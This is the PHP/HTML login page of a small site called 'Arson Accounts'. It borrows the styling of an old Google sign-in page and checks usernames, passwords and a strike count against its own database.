<?php require_once("assets/mod/db.php"); ?>
<!DOCTYPE html>
<html lang="en">
  <head>

  <meta charset="utf-8">
  <meta content="width=300, initial-scale=1" name="viewport">
  <title>Sign in - Arson Accounts</title>
<style>
  html, body {
  font-family: Arial, sans-serif;
  background: #fff;
  margin: 0;
  padding: 0;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 13px;
  color: #404040;
  direction: ltr;
  -webkit-text-size-adjust: none;
  }
  button,
  input[type=button],
  input[type=submit] {
  font-family: Arial, sans-serif;
  }
  a,
  a:hover,
  a:visited {
  color: #427fed;
  cursor: pointer;
  text-decoration: none;
  }
  a:hover {
  text-decoration: underline;
  }
  h1 {
  font-size: 20px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: normal;
  }
  h2 {
  font-size: 14px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: bold;
  }
  input[type=email],
  input[type=number],
  input[type=password],
  input[type=tel],
  input[type=text],
  input[type=url] {
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 36px;
  padding: 0 8px;
  margin: 0;
  background: #fff;
  border: 1px solid #d9d9d9;
  border-top: 1px solid #c0c0c0;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 1px;
  font-size: 15px;
  color: #404040;
  }
  input[type=email]:hover,
  input[type=number]:hover,
  input[type=password]:hover,
  input[type=tel]:hover,
  input[type=text]:hover,
  input[type=url]:hover {
  border: 1px solid #b9b9b9;
  border-top: 1px solid #a0a0a0;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  input[type=email]:focus,
  input[type=number]:focus,
  input[type=password]:focus,
  input[type=tel]:focus,
  input[type=text]:focus,
  input[type=url]:focus {
  outline: none;
  border: 1px solid #4d90fe;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  input[type=checkbox],
  input[type=radio] {
  -webkit-appearance: none;
  display: inline-block;
  width: 13px;
  height: 13px;
  margin: 0;
  cursor: pointer;
  vertical-align: bottom;
  background: #fff;
  border: 1px solid #c6c6c6;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 1px;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  position: relative;
  }
  input[type=checkbox]:active,
  input[type=radio]:active {
  background: #ebebeb;
  }
  input[type=checkbox]:hover {
  border-color: #c6c6c6;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  input[type=radio] {
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  width: 15px;
  height: 15px;
  }
  input[type=checkbox]:checked,
  input[type=radio]:checked {
  background: #fff;
  }
  input[type=radio]:checked::after {
  content: '';
  display: block;
  position: relative;
  top: 3px;
  left: 3px;
  width: 7px;
  height: 7px;
  background: #666;
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  }
  input[type=checkbox]:checked::after {
  content: url(//web.archive.org/web/20131216085513im_/https://ssl.gstatic.com/ui/v1/menu/checkmark.png);
  display: block;
  position: absolute;
  top: -6px;
  left: -5px;
  }
  input[type=checkbox]:focus {
  outline: none;
  border-color: #4d90fe;
  }
  .stacked-label {
  display: block;
  font-weight: bold;
  margin: .5em 0;
  }
  .hidden-label {
  position: absolute !important;
  clip: rect(1px 1px 1px 1px); /* IE6, IE7 */
  clip: rect(1px, 1px, 1px, 1px);
  height: 0px;
  width: 0px;
  overflow: hidden;
  visibility: hidden;
  }
  input[type=checkbox].form-error,
  input[type=email].form-error,
  input[type=number].form-error,
  input[type=password].form-error,
  input[type=text].form-error,
  input[type=tel].form-error,
  input[type=url].form-error {
  border: 1px solid #dd4b39;
  }
  .error-msg {
  margin: .5em 0;
  display: block;
  color: #dd4b39;
  line-height: 17px;
  }
  .help-link {
  background: #dd4b39;
  padding: 0 5px;
  color: #fff;
  font-weight: bold;
  display: inline-block;
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  text-decoration: none;
  position: relative;
  top: 0px;
  }
  .help-link:visited {
  color: #fff;
  }
  .help-link:hover {
  color: #fff;
  background: #c03523;
  text-decoration: none;
  }
  .help-link:active {
  opacity: 1;
  background: #ae2817;
  }
  .wrapper {
  position: relative;
  min-height: 100%;
  }
  .content {
  padding: 0 44px;
  }
  .main {
  padding-bottom: 100px;
  }
  /* For modern browsers */
  .clearfix:before,
  .clearfix:after {
  content: "";
  display: table;
  }
  .clearfix:after {
  clear: both;
  }
  /* For IE 6/7 (trigger hasLayout) */
  .clearfix {
  zoom:1;
  }
  .google-header-bar {
  height: 71px;
  border-bottom: 1px solid #e5e5e5;
  overflow: hidden;
  }
  .header .logo {
  margin: 17px 0 0;
  float: left;
  height: 38px;
  width: 116px;
  }
  .header .secondary-link {
  margin: 28px 0 0;
  float: right;
  }
  .header .secondary-link a {
  font-weight: normal;
  }
  .google-header-bar.centered {
  border: 0;
  height: 108px;
  }
  .google-header-bar.centered .header .logo {
  float: none;
  margin: 40px auto 30px;
  display: block;
  }
  .google-header-bar.centered .header .secondary-link {
  display: none
  }
  .google-footer-bar {
  position: absolute;
  bottom: 0;
  height: 35px;
  width: 100%;
  border-top: 1px solid #e5e5e5;
  overflow: hidden;
  }
  .footer {
  padding-top: 7px;
  font-size: .85em;
  white-space: nowrap;
  line-height: 0;
  }
  .footer ul {
  float: left;
  max-width: 80%;
  padding: 0;
  }
  .footer ul li {
  color: #737373;
  display: inline;
  padding: 0;
  padding-right: 1.5em;
  }
  .footer a {
  color: #737373;
  }
  .lang-chooser-wrap {
  float: right;
  display: inline;
  }
  .lang-chooser-wrap img {
  vertical-align: middle;
  }
  .hidden {
  height: 0px;
  width: 0px;
  overflow: hidden;
  visibility: hidden;
  display: none !important;
  }
  .card {
  background-color: #f7f7f7;
  padding: 20px 25px 30px;
  margin: 0 auto 25px;
  width: 304px;
  -moz-border-radius: 2px;
  -webkit-border-radius: 2px;
  border-radius: 2px;
  -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  }
  .card *:first-child {
  margin-top: 0;
  }
  .rc-button {
  display: inline-block;
  min-width: 46px;
  text-align: center;
  color: #444;
  font-size: 14px;
  font-weight: 700;
  height: 36px;
  padding: 0 8px;
  line-height: 36px;
  -moz-border-radius: 3px;
  -webkit-border-radius: 3px;
  border-radius: 3px;
  -o-transition: all 0.218s;
  -moz-transition: all 0.218s;
  -webkit-transition: all 0.218s;
  transition: all 0.218s;
  border: 1px solid #dcdcdc;
  background-color: #f5f5f5;
  background-image: -webkit-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -o-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: linear-gradient(top,#f5f5f5,#f1f1f1);
  -o-transition: none;
  -moz-user-select: none;
  -webkit-user-select: none;
  user-select: none;
  cursor: default;
  }
  .card .rc-button {
  width: 100%;
  padding: 0;
  }
  .rc-button:hover {
  border: 1px solid #c6c6c6;
  color: #333;
  text-decoration: none;
  -o-transition: all 0.0s;
  -moz-transition: all 0.0s;
  -webkit-transition: all 0.0s;
  transition: all 0.0s;
  background-color: #f8f8f8;
  background-image: -webkit-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -o-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: linear-gradient(top,#f8f8f8,#f1f1f1);
  -moz-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  }
  .rc-button:active {
  background-color: #f6f6f6;
  background-image: -webkit-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -o-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: linear-gradient(top,#f6f6f6,#f1f1f1);
  -moz-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  }
  .rc-button-submit {
  border: 1px solid #3079ed;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  background-color: #4d90fe;
  background-image: -webkit-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -moz-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -ms-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -o-linear-gradient(top,#4d90fe,#4787ed);
  background-image: linear-gradient(top,#4d90fe,#4787ed);
  }
  .rc-button-submit:hover {
  border: 1px solid #2f5bb7;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #357ae8;
  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
  background-image: linear-gradient(top,#4d90fe,#357ae8);
  }
  .rc-button-submit:active {
  background-color: #357ae8;
  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
  background-image: linear-gradient(top,#4d90fe,#357ae8);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  .rc-button-red {
  border: 1px solid transparent;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  background-color: #d14836;
  background-image: -webkit-linear-gradient(top,#dd4b39,#d14836);
  background-image: -moz-linear-gradient(top,#dd4b39,#d14836);
  background-image: -ms-linear-gradient(top,#dd4b39,#d14836);
  background-image: -o-linear-gradient(top,#dd4b39,#d14836);
  background-image: linear-gradient(top,#dd4b39,#d14836);
  }
  .rc-button-red:hover {
  border: 1px solid #b0281a;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #c53727;
  background-image: -webkit-linear-gradient(top,#dd4b39,#c53727);
  background-image: -moz-linear-gradient(top,#dd4b39,#c53727);
  background-image: -ms-linear-gradient(top,#dd4b39,#c53727);
  background-image: -o-linear-gradient(top,#dd4b39,#c53727);
  background-image: linear-gradient(top,#dd4b39,#c53727);
  }
  .rc-button-red:active {
  border: 1px solid #992a1b;
  background-color: #b0281a;
  background-image: -webkit-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -moz-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -ms-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -o-linear-gradient(top,#dd4b39,#b0281a);
  background-image: linear-gradient(top,#dd4b39,#b0281a);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .google-header-bar.centered {
  height: 83px;
  }
  .google-header-bar.centered .header .logo {
  margin: 25px auto 20px;
  }
  .card {
  margin-bottom: 20px;
  }
</style>
<style media="screen and (max-width: 580px)">
  html, body {
  font-size: 14px;
  }
  .google-header-bar.centered {
  height: 73px;
  }
  .google-header-bar.centered .header .logo {
  margin: 20px auto 15px;
  }
  .content {
  padding-left: 10px;
  padding-right: 10px;
  }
  .hidden-small {
  display: none;
  }
  .card {
  padding: 20px 15px 30px;
  width: 270px;
  }
  .footer ul li {
  padding-right: 1em;
  }
  .lang-chooser-wrap {
  display: none;
  }
</style>
<style>
  pre.debug {
  font-family: monospace;
  position: absolute;
  left: 0;
  margin: 0;
  padding: 1.5em;
  font-size: 13px;
  background: #f1f1f1;
  border-top: 1px solid #e5e5e5;
  direction: ltr;
  white-space: pre-wrap;
  width: 90%;
  overflow: hidden;
  }
</style>
  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400&amp;lang=en" rel="stylesheet" type="text/css">
<style>
  .banner {
  text-align: center;
  }
  .banner h1 {
  font-family: 'Open Sans', arial;
  -webkit-font-smoothing: antialiased;
  color: #555;
  font-size: 42px;
  font-weight: 300;
  margin-top: 0;
  margin-bottom: 20px;
  }
  .banner h2 {
  font-family: 'Open Sans', arial;
  -webkit-font-smoothing: antialiased;
  color: #555;
  font-size: 18px;
  font-weight: 400;
  margin-bottom: 20px;
  }
  .signin-card {
  width: 274px;
  padding: 40px 40px;
  }
  .signin-card .profile-img {
  width: 96px;
  height: 96px;
  margin: 0 auto 10px;
  display: block;
  -moz-border-radius: 50%;
  -webkit-border-radius: 50%;
  border-radius: 50%;
  }
  .signin-card .profile-name {
  font-size: 16px;
  font-weight: bold;
  text-align: center;
  margin: 10px 0 0;
  min-height: 1em;
  }
  .signin-card input[type=email],
  .signin-card input[type=password],
  .signin-card input[type=text],
  .signin-card input[type=submit] {
  width: 100%;
  display: block;
  margin-bottom: 10px;
  z-index: 1;
  position: relative;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  }
  .signin-card #Email,
  .signin-card #Passwd,
  .signin-card .captcha {
  direction: ltr;
  height: 44px;
  font-size: 16px;
  }
  .signin-card #Email + .stacked-label {
  margin-top: 15px;
  }
  .signin-card #reauthEmail {
  display: block;
  margin-bottom: 10px;
  line-height: 36px;
  padding: 0 8px;
  font-size: 15px;
  color: #404040;
  line-height: 2;
  margin-bottom: 10px;
  font-size: 14px;
  text-align: center;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  }
  .one-google p {
  margin: 0 0 10px;
  color: #555;
  font-size: 14px;
  text-align: center;
  }
  .one-google p.create-account,
  .one-google p.switch-account {
  margin-bottom: 60px;
  }
  .one-google img {
  display: block;
  width: 210px;
  height: 17px;
  margin: 10px auto;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .banner h1 {
  font-size: 38px;
  margin-bottom: 15px;
  }
  .banner h2 {
  margin-bottom: 15px;
  }
  .one-google p.create-account,
  .one-google p.switch-account {
  margin-bottom: 30px;
  }
  .signin-card #Email {
  margin-bottom: 0;
  }
  .signin-card #Passwd {
  margin-top: -1px;
  }
  .signin-card #Email.form-error,
  .signin-card #Passwd.form-error {
  z-index: 2;
  }
  .signin-card #Email:hover,
  .signin-card #Email:focus,
  .signin-card #Passwd:hover,
  .signin-card #Passwd:focus {
  z-index: 3;
  }
</style>
<style media="screen and (max-width: 580px)">
  .banner h1 {
  font-size: 22px;
  margin-bottom: 15px;
  }
  .signin-card {
  width: 260px;
  padding: 20px 20px;
  margin: 0 auto 20px;
  }
  .signin-card .profile-img {
  width: 72px;
  height: 72px;
  -moz-border-radius: 72px;
  -webkit-border-radius: 72px;
  border-radius: 72px;
  }
</style>
<style>
  .jfk-tooltip {
  background-color: #fff;
  border: 1px solid;
  color: #737373;
  font-size: 12px;
  position: absolute;
  z-index: 800 !important;
  border-color: #bbb #bbb #a8a8a8;
  padding: 16px;
  width: 250px;
  }
 .jfk-tooltip h3 {
  color: #555;
  font-size: 12px;
  margin: 0 0 .5em;
  }
 .jfk-tooltip-content p:last-child {
  margin-bottom: 0;
  }
  .jfk-tooltip-arrow {
  position: absolute;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplbefore,
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplafter {
  display: block;
  height: 0;
  position: absolute;
  width: 0;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplbefore {
  border: 9px solid;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplafter {
  border: 8px solid;
  }
  .jfk-tooltip-arrowdown {
  bottom: 0;
  }
  .jfk-tooltip-arrowup {
  top: -9px;
  }
  .jfk-tooltip-arrowleft {
  left: -9px;
  top: 30px;
  }
  .jfk-tooltip-arrowright {
  right: 0;
  top: 30px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore,.jfk-tooltip-arrowup .jfk-tooltip-arrowimplbefore {
  border-color: #bbb transparent;
  left: -9px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore {
  border-color: #a8a8a8 transparent;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplafter,.jfk-tooltip-arrowup .jfk-tooltip-arrowimplafter {
  border-color: #fff transparent;
  left: -8px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore {
  border-bottom-width: 0;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplafter {
  border-bottom-width: 0;
  }
  .jfk-tooltip-arrowup .jfk-tooltip-arrowimplbefore {
  border-top-width: 0;
  }
  .jfk-tooltip-arrowup .jfk-tooltip-arrowimplafter {
  border-top-width: 0;
  top: 1px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplbefore,
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplbefore {
  border-color: transparent #bbb;
  top: -9px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplafter,
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplafter {
  border-color:transparent #fff;
  top:-8px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplbefore {
  border-left-width: 0;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplafter {
  border-left-width: 0;
  left: 1px;
  }
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplbefore {
  border-right-width: 0;
  }
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplafter {
  border-right-width: 0;
  }
  .jfk-tooltip-closebtn {
  background: url("//web.archive.org/web/20131216085513im_/https://ssl.gstatic.com/ui/v1/icons/common/x_8px.png") no-repeat;
  border: 1px solid transparent;
  height: 21px;
  opacity: .4;
  outline: 0;
  position: absolute;
  right: 2px;
  top: 2px;
  width: 21px;
  }
  .jfk-tooltip-closebtn:focus,
  .jfk-tooltip-closebtn:hover {
  opacity: .8;
  cursor: pointer;
  }
  .jfk-tooltip-closebtn:focus {
  border-color: #4d90fe;
  }
</style>
<style media="screen and (max-width: 580px)">
  .jfk-tooltip {
  display: none;
  }
</style>
<style>
  .need-help-reverse {
  float: right;
  }
  .remember .bubble-wrap {
  position: absolute;
  padding-top: 3px;
  -o-transition: opacity .218s ease-in .218s;
  -moz-transition: opacity .218s ease-in .218s;
  -webkit-transition: opacity .218s ease-in .218s;
  transition: opacity .218s ease-in .218s;
  left: -999em;
  opacity: 0;
  width: 314px;
  margin-left: -20px;
  }
  .remember:hover .bubble-wrap,
  .remember input:focus ~ .bubble-wrap,
  .remember .bubble-wrap:hover,
  .remember .bubble-wrap:focus {
  opacity: 1;
  left: inherit;
  }
  .bubble-pointer {
  border-left: 10px solid transparent;
  border-right: 10px solid transparent;
  border-bottom: 10px solid #fff;
  width: 0;
  height: 0;
  margin-left: 17px;
  }
  .bubble {
  background-color: #fff;
  padding: 15px;
  margin-top: -1px;
  font-size: 11px;
  -moz-border-radius: 2px;
  -webkit-border-radius: 2px;
  border-radius: 2px;
  -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  }
  .dasher-tooltip {
  position: absolute;
  left: 50%;
  top: 380px;
  margin-left: 150px;
  }
  .dasher-tooltip .tooltip-pointer {
  margin-top: 15px;
  }
  .dasher-tooltip p {
  margin-top: 0;
  }
  .dasher-tooltip p span {
  display: block;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .dasher-tooltip {
  top: 340px;
  }
</style>
  </head>
  <body>
 
  <div class="wrapper">
  <div class="google-header-bar  centered">
  <div class="header content clearfix">
  <img alt="Arson" class="logo" style="filter:invert(1);" src="./assets/img/logo.png">
  </div>
  </div>
  <div class="main content clearfix">
<div class="banner">
<h1>
  One account. All of Arson.
</h1>
  <h2 class="hidden-small">
  Sign in with your Arson Account
  </h2>
</div>
<div class="card signin-card clearfix">
<img class="profile-img" src="//web.archive.org/web/20131216085513im_/https://ssl.gstatic.com/accounts/ui/avatar_2x.png" alt="">
<p class="profile-name"></p>
<?php
                                if(!empty($_POST)){
                                    $username = htmlspecialchars($_POST['name']);
                                    $statement = $mysqli->prepare("SELECT `password`, `strikes` FROM `users` WHERE `username` = ? LIMIT 1");
                                    $statement->bind_param("s", $username);
                                    $statement->execute();
                                    $result = $statement->get_result();
                                    if($result->num_rows !== 0){
                                    while($row = $result->fetch_assoc()){
                                            $hash = $row['password'];
                                            if(password_verify($_POST['password'], $hash)){
                                              if ($row['strikes'] > 3) {
                                                echo('<div class="alert-message error loginerror page-alert">
                                     <p>Your account has been terminated due to too many violations of the <a style="color:white;"href=guidelines>Community Guidelines</a>.</p>
                                     </div>');
                                            } else {
                                                $_SESSION["profileuser3"] = htmlspecialchars($_POST['name']);
                                                echo('<script>
                                                   window.location.href = "/";</script>');
                                             //   echo("<a href='.'>Click here to go home</a>");
                                            }
                                            }
                                            else {
                                                echo '
                                                <div class="alert-message error loginerror page-alert">
                                                  <p>Username and password combo do not match our records.</p>
                                                </div>';
                                            }
                                        }
                                    }
                                    else{
                                        echo '
                                        <div class="alert-message error loginerror page-alert">
                                        <p>Username and password combo do not match our records.</p>
                                      </div>';
                                    }
                                }
                            ?>
  <form novalidate method="post" action="" id="gaia_loginform">
  <input name="GALX" type="hidden" value="Jaz_C61Ia7Y">
  <input name="continue" type="hidden" value="http://www.google.com/">
  <input name="hl" type="hidden" value="en">
  <input type="hidden" id="_utf8" name="_utf8" value="☃"/>
  <input type="hidden" name="bgresponse" id="bgresponse" value="js_disabled">
<label class="hidden-label" for="Email">Email</label>
<input id="Name" name="name" type="text" placeholder="Username" value="" spellcheck="false" class="">
<label class="hidden-label" for="Passwd">Password</label>
<input id="Passwd" name="password" type="password" placeholder="Password" class="">
<input id="signIn" name="submit" class="rc-button rc-button-submit" type="submit" value="Sign in">
 <!-- <label class="remember">
  <input id="PersistentCookie" name="PersistentCookie" type="checkbox" value="yes" checked="checked">
  <span>
  Stay signed in
  </span>
  <div class="bubble-wrap" role="tooltip">
  <div class="bubble-pointer"></div>
  <div class="bubble">
  For your protection, keep this checked only on devices you use regularly.
  <a href="http://web.archive.org/web/20131216085513/https://support.google.com/accounts/?p=securesignin&amp;hl=en" target="_blank">Learn more</a>
  </div>
  </div>
  </label>
  <input type="hidden" name="rmShown" value="1">
  <a id="link-forgot-passwd" href="http://web.archive.org/web/20131216085513/https://accounts.google.com/RecoverAccount?continue=http%3A%2F%2Fwww.google.com%2F" class="need-help-reverse">
  Need help?
  </a>-->
  </form>
</div>
<div class="one-google">
  <p class="create-account">
  <a id="link-signup" href="asignup">
  Create an account
  </a>
  </p>
<p class="tagline">
  One Arson Account for everything Arson
</p>
<img src="./assets/img/appbar.png" width="210" height="17" alt="">
</div>
  </div>
  <div class="google-footer-bar">
  <div class="footer content clearfix">
  <ul id="footer-list">
  <li>
  Arson
  </li>
  <li>
  <a href="guidelines" target="_blank">
  Privacy &amp; Terms
  </a>
  </li>
  <li>
  <a href="#" target="_blank">
  Help
  </a>
  </li>
  </ul>
  <div id="lang-vis-control" style="display: none">
  <span id="lang-chooser-wrap" class="lang-chooser-wrap">
  <label for="lang-chooser"><img src="//web.archive.org/web/20131216085513im_/https://ssl.gstatic.com/images/icons/ui/common/universal_language_settings-21.png" alt="Change language"></label>
  <select id="lang-chooser" class="lang-chooser" name="lang-chooser">
  <option value="af">
  ‪Afrikaans‬
  </option>
  <option value="az">
  ‪azərbaycanca‬
  </option>
  <option value="in">
  ‪Bahasa Indonesia‬
  </option>
  <option value="ms">
  ‪Bahasa Melayu‬
  </option>
  <option value="ca">
  ‪català‬
  </option>
  <option value="cs">
  ‪čeština‬
  </option>
  <option value="da">
  ‪dansk‬
  </option>
  <option value="de">
  ‪Deutsch‬
  </option>
  <option value="et">
  ‪eesti‬
  </option>
  <option value="en-GB">
  ‪English (United Kingdom)‬
  </option>
  <option value="en" selected="selected">
  ‪English (United States)‬
  </option>
  <option value="es">
  ‪español (España)‬
  </option>
  <option value="es-419">
  ‪español (Latinoamérica)‬
  </option>
  <option value="eu">
  ‪euskara‬
  </option>
  <option value="fil">
  ‪Filipino‬
  </option>
  <option value="fr-CA">
  ‪français (Canada)‬
  </option>
  <option value="fr">
  ‪français (France)‬
  </option>
  <option value="gl">
  ‪galego‬
  </option>
  <option value="hr">
  ‪hrvatski‬
  </option>
  <option value="zu">
  ‪isiZulu‬
  </option>
  <option value="is">
  ‪íslenska‬
  </option>
  <option value="it">
  ‪italiano‬
  </option>
  <option value="sw">
  ‪Kiswahili‬
  </option>
  <option value="lv">
  ‪latviešu‬
  </option>
  <option value="lt">
  ‪lietuvių‬
  </option>
  <option value="hu">
  ‪magyar‬
  </option>
  <option value="nl">
  ‪Nederlands‬
  </option>
  <option value="no">
  ‪norsk‬
  </option>
  <option value="pl">
  ‪polski‬
  </option>
  <option value="pt">
  ‪português‬
  </option>
  <option value="pt-BR">
  ‪português (Brasil)‬
  </option>
  <option value="pt-PT">
  ‪português (Portugal)‬
  </option>
  <option value="ro">
  ‪română‬
  </option>
  <option value="sk">
  ‪slovenčina‬
  </option>
  <option value="sl">
  ‪slovenščina‬
  </option>
  <option value="fi">
  ‪suomi‬
  </option>
  <option value="sv">
  ‪svenska‬
  </option>
  <option value="vi">
  ‪Tiếng Việt‬
  </option>
  <option value="tr">
  ‪Türkçe‬
  </option>
  <option value="el">
  ‪Ελληνικά‬
  </option>
  <option value="bg">
  ‪български‬
  </option>
  <option value="mn">
  ‪монгол‬
  </option>
  <option value="ru">
  ‪русский‬
  </option>
  <option value="sr">
  ‪Српски‬
  </option>
  <option value="uk">
  ‪українська‬
  </option>
  <option value="ka">
  ‪ქართული‬
  </option>
  <option value="hy">
  ‪հայերեն‬
  </option>
  <option value="iw">
  ‫עברית‬‎
  </option>
  <option value="ur">
  ‫اردو‬‎
  </option>
  <option value="ar">
  ‫العربية‬‎
  </option>
  <option value="fa">
  ‫فارسی‬‎
  </option>
  <option value="am">
  ‪አማርኛ‬
  </option>
  <option value="ne">
  ‪नेपाली‬
  </option>
  <option value="mr">
  ‪मराठी‬
  </option>
  <option value="hi">
  ‪हिन्दी‬
  </option>
  <option value="bn">
  ‪বাংলা‬
  </option>
  <option value="gu">
  ‪ગુજરાતી‬
  </option>
  <option value="ta">
  ‪தமிழ்‬
  </option>
  <option value="te">
  ‪తెలుగు‬
  </option>
  <option value="kn">
  ‪ಕನ್ನಡ‬
  </option>
  <option value="ml">
  ‪മലയാളം‬
  </option>
  <option value="si">
  ‪සිංහල‬
  </option>
  <option value="th">
  ‪ไทย‬
  </option>
  <option value="lo">
  ‪ລາວ‬
  </option>
  <option value="km">
  ‪ខ្មែរ‬
  </option>
  <option value="ko">
  ‪한국어‬
  </option>
  <option value="zh-HK">
  ‪中文（香港）‬
  </option>
  <option value="ja">
  ‪日本語‬
  </option>
  <option value="zh-CN">
  ‪简体中文‬
  </option>
  <option value="zh-TW">
  ‪繁體中文‬
  </option>
  </select>
  </span>
  </div>
  </div>
</div>
  </div>
  <script>
  (function(){
  var splitByFirstChar = function(toBeSplit, splitChar) {
  var index = toBeSplit.indexOf(splitChar);
  if (index >= 0) {
  return [toBeSplit.substring(0, index),
  toBeSplit.substring(index + 1)];
  }
  return [toBeSplit];
  }
  var langChooser_parseParams = function(paramsSection) {
  if (paramsSection) {
  var query = {};
  var params = paramsSection.split('&');
  for (var i = 0; i < params.length; i++) {
              var param = splitByFirstChar(params[i], '=');
              if (param.length == 2) {
                query[param[0]] = param[1];
              }
            }
            return query;
          }
          return {};
        }
        var langChooser_getParamStr = function(params) {
          var paramsStr = [];
          for (var a in params) {
            paramsStr.push(a + "=" + params[a]);
          }
          return paramsStr.join('&');
        }
        var langChooser_currentUrl = window.location.href;
        var match = langChooser_currentUrl.match("^(.*?)(\\?(.*?))?(#(.*))?$");
        var langChooser_currentPath = match[1];
        var langChooser_params = langChooser_parseParams(match[3]);
        var langChooser_fragment = match[5];

        var langChooser = document.getElementById('lang-chooser');
        var langChooserWrap = document.getElementById('lang-chooser-wrap');
        var langVisControl = document.getElementById('lang-vis-control');
        if (langVisControl && langChooser) {
          langVisControl.style.display = 'inline';
          langChooser.onchange = function() {
            langChooser_params['lp'] = 1;
            langChooser_params['hl'] = encodeURIComponent(this.value);
